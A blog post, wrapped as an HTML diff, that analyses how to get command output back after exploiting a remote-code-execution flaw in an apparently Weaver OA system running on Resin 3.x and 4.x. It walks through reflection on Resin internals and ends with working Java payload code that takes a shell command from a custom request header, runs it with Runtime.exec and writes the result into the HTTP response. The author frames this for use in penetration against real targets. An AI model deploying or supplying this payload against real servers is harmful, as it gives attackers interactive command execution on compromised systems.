@@ -1,0 +1,215 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>某微RCE回显利用分析 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="某微RCE回显利用分析"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>某微RCE回显利用分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/05/20/某微RCE回显利用分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-05-20T07:03:08.000Z">
+          2021-05-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​        最近某微爆出RCE漏洞，本想着通过相对路径写入shell，但是不知是什么原因，在实际渗透中并没有成功，内存马这里也考虑了一下，但是由于这里的利用需要将class经过BCEL编码，由于无法将两个类进行BCEL编码，所以只能放弃了种内存马的想法，那目前最稳妥的方法就是获得命令执行的结果，让攻击者根据自己的需求去完成后续的利用。</p>
+<span id="more"></span>
+
+<h2 id="Resin-4-x获取命令执行结果"><a href="#Resin-4-x获取命令执行结果" class="headerlink" title="Resin 4.x获取命令执行结果"></a>Resin 4.x获取命令执行结果</h2><p>​        有大佬已经给出了在Resin 4.x中获取回显的方法了，下面我们先学习一下他的思路。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class tcpsocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.caucho.network.listen.TcpSocketLink&quot;</span>); <span class="comment">//获取TcpSocketLink Class对象。</span></span><br><span class="line">    Method getCurrentRequestM = tcpsocketLinkClazz.getMethod(<span class="string">&quot;getCurrentRequest&quot;</span>); <span class="comment">//通过反射得到getCurrentRequest方法</span></span><br><span class="line">    Object currentRequest = getCurrentRequestM.invoke((Object)<span class="keyword">null</span>); <span class="comment">//调用getCurrentRequest方法获取返回结果</span></span><br><span class="line">    Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;_responseFacade&quot;</span>);<span class="comment">//获取_responseFacade变量</span></span><br><span class="line">    f.setAccessible(<span class="keyword">true</span>); <span class="comment">//改变获取_responseFacade变量的访问权限</span></span><br><span class="line">    Object response = f.get(currentRequest);<span class="comment">//获取response对象</span></span><br><span class="line">    Method getWriterM = response.getClass().getMethod(<span class="string">&quot;getWriter&quot;</span>); <span class="comment">//获取getWriter方法</span></span><br><span class="line">    Writer w = (Writer)getWriterM.invoke(response); <span class="comment">//调用getWriter获取Writer独享</span></span><br><span class="line">    w.write(<span class="string">&quot;powered by potatso&quot;</span>); <span class="comment">//写入回显内容</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">    var11.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        我们先看看在resin 4.X中，如何获取response对象。为此我写了一个servlet并打印出到达servlet的调用栈。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">doGet:<span class="number">98</span>, HelloWorld</span><br><span class="line">service:<span class="number">120</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">97</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">doFilter:<span class="number">109</span>, ServletFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">10</span>, FirstFilter</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">156</span>, WebAppFilterChain (com.caucho.server.webapp)</span><br><span class="line">doFilter:<span class="number">95</span>, AccessLogFilterChain (com.caucho.server.webapp)</span><br><span class="line">service:<span class="number">314</span>, ServletInvocation (com.caucho.server.dispatch)</span><br><span class="line">handleRequest:<span class="number">843</span>, HttpRequest (com.caucho.server.http)</span><br><span class="line">dispatchRequest:<span class="number">1395</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequest:<span class="number">1351</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequestsImpl:<span class="number">1335</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequests:<span class="number">1243</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleAcceptTaskImpl:<span class="number">1037</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">runThread:<span class="number">117</span>, ConnectionTask (com.caucho.network.listen)</span><br><span class="line">run:<span class="number">93</span>, ConnectionTask (com.caucho.network.listen)</span><br><span class="line">handleTasks:<span class="number">175</span>, SocketLinkThreadLauncher (com.caucho.network.listen)</span><br><span class="line">run:<span class="number">61</span>, TcpSocketAcceptThread (com.caucho.network.listen)</span><br><span class="line">runTasks:<span class="number">173</span>, ResinThread2 (com.caucho.env.thread2)</span><br><span class="line">run:<span class="number">118</span>, ResinThread2 (com.caucho.env.thread2)</span><br></pre></td></tr></table></figure>
+
+<p>​        Response对象主要来自于<code>com.caucho.server.http.HttpRequest#handleRequest</code></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524155652633.png" alt="image-20210524155652633"></p>
+<p> <code>com.caucho.server.http.AbstractHttpRequest#getResponseFacade</code>中返回了Response对象。所以如果我们能获取到AbstractHttpRequest对象并调用该对象的getResponseFacade方法，即可获取response对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524155750330.png" alt="image-20210524155750330"></p>
+<p>​        现在的目标转到获取AbstractHttpRequest对象,再查看下类的继承关系，通过下面的继承关系可以得到，想要获取AbstractHttpRequest对象，也可以获取它的子类或者父类。当然获取父类不一定就能得到AbstractHttpRequest对象，这个和具体返回的对象是什么类型有关系。要想通过反射得到对应的对象，主要还是要寻找返回类型为该对象并且由static修饰的方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static ProtocolConnection</span><br><span class="line">public static AbstractProtocolConnection</span><br><span class="line">public static AbstractHttpRequest</span><br><span class="line">public static FastCgiRequest</span><br><span class="line">public static HttpRequest</span><br><span class="line">public static SocketPolicyRequest</span><br><span class="line">public static SocketPolicyRequest</span><br><span class="line">public static HmuxRequest</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524161550917.png" alt="image-20210524161550917"></p>
+<p>​        经过一番搜索，只有下面的两个方法会返回ProtocolConnection对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524163202219.png" alt="image-20210524163202219"></p>
+<p>​            先看看<code>com.caucho.ejb.util.EjbUtil#createRequestContext</code>方法，这个方法要返回ProtocolConnection的条件是需要user的内容不为Null,但实际上我通过反射调用该方法user为Null，因此不会返回ProtocolConnection对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524163936899.png" alt="image-20210524163936899"></p>
+<p>​        所以只能通过<code>com.caucho.network.listen.TcpSocketLink#getCurrentRequest</code>来获取该对象，从<code>_currentRequest</code>获取对象，并且<code>_currentRequest</code>也是static类型的，所以可以通过反射拿到。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524164120690.png" alt="image-20210524164120690"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524164155683.png" alt="image-20210524164155683"></p>
+<p>​    但是获取的<code>ProtocolConnection</code>对象实际类型是否是我们想要的<code>AbstractHttpRequest</code>类型呢?可以尝试获取下。可以看到实际上获取的是HttpRequest对象。而HttpRequest对象是我们想要的<code>AbstractHttpRequest</code>的子类，所以是可以满足我们的要求的。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524165013268.png" alt="image-20210524165013268"></p>
+<p>​        最后梳理一下Resin 4.x获取回显的思路。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 通过调用TcpSocketLink.getCurrentRequest()获取ProtocolConnection对象。</span><br><span class="line">2. 通过调用getResponseFacade方法获取response对象。</span><br><span class="line">3. 通过反射调用reponse对象的getWriter方法获取PrintWriter对象。</span><br><span class="line">4. 通过PrintWriter对象的write方法写入回显内容。</span><br></pre></td></tr></table></figure>
+
+<h2 id="Resin-3-x获取命令执行结果"><a href="#Resin-3-x获取命令执行结果" class="headerlink" title="Resin 3.x获取命令执行结果"></a><strong>Resin 3.x获取命令执行结果</strong></h2><p>​        虽然上面的回显方案可以解决大部分问题，但是我本地搭建的泛微OA V8.0却不能使用上面的方案，经过分析在Resin 3.X系统中并没有<code>com.caucho.network.listen.TcpSocketLink</code>。和上面的思路类似，我们先看看在正常的使用中，系统是如何获取Response对象的。执行任意一个请求并打断点，可以看到并不是通过TcpSocketLink类到Request请求的。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524171146487.png" alt="image-20210524171146487"></p>
+<p>​        在<code>com.caucho.server.connection.AbstractHttpRequest</code>中可以获取response对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192646646.png" alt="image-20210524192646646"></p>
+<p>​        同理，查看类的继承结构，可以通过获取ServletRequest间接获取AbstractHttpRequest对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192734916.png" alt="image-20210524192734916"></p>
+<p>​    经过搜索可以在<code>com.caucho.server.dispatch.ServletInvocation#getContextRequest</code>中拿到ServletRequest对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192932012.png" alt="image-20210524192932012"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524192952083.png" alt="image-20210524192952083"></p>
+<p>​        测试代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.caucho.server.dispatch.ServletInvocation&quot;</span>).getMethod(<span class="string">&quot;getContextRequest&quot;</span>).invoke((Object)<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524193143325.png" alt="image-20210524193143325"></p>
+<p>​    获取到ServletRequest对象后，通过_response字段的内容获取到response对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;_response&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">Object response = f.get(currentRequest);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524193905979.png" alt="image-20210524193905979"></p>
+<p>​        获取Writer并执行写入操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method getWriterM = response.getClass().getMethod(<span class="string">&quot;getWriter&quot;</span>); </span><br><span class="line">Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">w.write(<span class="string">&quot;test666&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​        整体的代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.caucho.server.dispatch.ServletInvocation&quot;</span>).getMethod(<span class="string">&quot;getContextRequest&quot;</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;_response&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">Object response = f.get(currentRequest);</span><br><span class="line">Method getWriterM = response.getClass().getMethod(<span class="string">&quot;getWriter&quot;</span>); </span><br><span class="line">Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">w.write(<span class="string">&quot;test666&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525094741508.png" alt="image-20210525094741508"></p>
+<h2 id="通用回显"><a href="#通用回显" class="headerlink" title="通用回显"></a>通用回显</h2><p>​        在Resin 4.X中查看是否可以通过getContextRequest获取request对象，通过<code>TcpSocketLink.getCurrentRequest()</code>获取ProtocolConnection对象并返回，也就是说在Resin 4.X中也可以通过ServletInvocation的getContextRequest方法获取回显。通过ServletInvocation获取request对象是版本兼容的。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525095734484.png" alt="image-20210525095734484"></p>
+<p>​        虽然在 Resin 3.x和4.x都获取了request对象，但实际上获取的request对象的实际类型是不同的。</p>
+<p><strong>Resin 3.x</strong></p>
+<p>​        在resin 3.x中获取的类型是HttpRequest对象，HttpRequest类中并没有保存_response对象，需要从父类AbstractHttpRequest中获取。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111526652.png" alt="image-20210525111526652"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111704916.png" alt="image-20210525111704916"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111926125.png" alt="image-20210525111926125"></p>
+<p>​        通过上面的分析在resin 3.x中获取response对象需要使用下面的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.caucho.server.dispatch.ServletInvocation&quot;</span>).getMethod(<span class="string">&quot;getContextRequest&quot;</span>).invoke((Object)<span class="keyword">null</span>).getClass().getSuperclass().getDeclaredField(<span class="string">&quot;_response&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Resin 4.x</strong></p>
+<p>在Resin 4中获取的实际类型是HttpServletRequestImpl类型。HttpServletRequestImpl中直接保存了_response对象，所以可以用HttpServletRequestImpl的类加载器直接获取response对象。</p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111156669.png" alt="image-20210525111156669"></p>
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525111305609.png" alt="image-20210525111305609"></p>
+<p>​        在resin 4.x中使用下面的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.caucho.server.dispatch.ServletInvocation&quot;</span>).getMethod(<span class="string">&quot;getContextRequest&quot;</span>).invoke((Object)<span class="keyword">null</span>).getClass().getDeclaredField(<span class="string">&quot;_response&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210525112344783.png" alt="image-20210525112344783"></p>
+<p><strong>代码整合</strong></p>
+<p>​        通过上面的分析，可以通过判断获取的request对象的类型来判断resin的版本，再根据版本的不同选择不同微调代码进行回显利用。根据获取request对象的不同，通过不同的方式获取response对象。下面是从请求头获取命令执行并回显的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            Field f;</span><br><span class="line">           Object currentRequest =Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.caucho.server.dispatch.ServletInvocation&quot;</span>).getMethod(<span class="string">&quot;getContextRequest&quot;</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">           Class&lt;?&gt; c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.caucho.server.http.HttpRequest&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span>(c.isInstance(currentRequest))&#123;</span><br><span class="line">               f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;_response&quot;</span>);</span><br><span class="line"></span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               f = currentRequest.getClass().getDeclaredField(<span class="string">&quot;_response&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">            f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object response = f.get(currentRequest);</span><br><span class="line">            Method getWriterM = response.getClass().getMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">            Writer w = (Writer)getWriterM.invoke(response);</span><br><span class="line">            Method getHeaderM = currentRequest.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, String.class);</span><br><span class="line">            String cmd = (String)getHeaderM.invoke(currentRequest, <span class="string">&quot;sectest666&quot;</span>);</span><br><span class="line">            Scanner s = (<span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            w.write(s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | IOException | IllegalAccessException | ClassNotFoundException | NoSuchFieldException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞利用/">漏洞利用</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
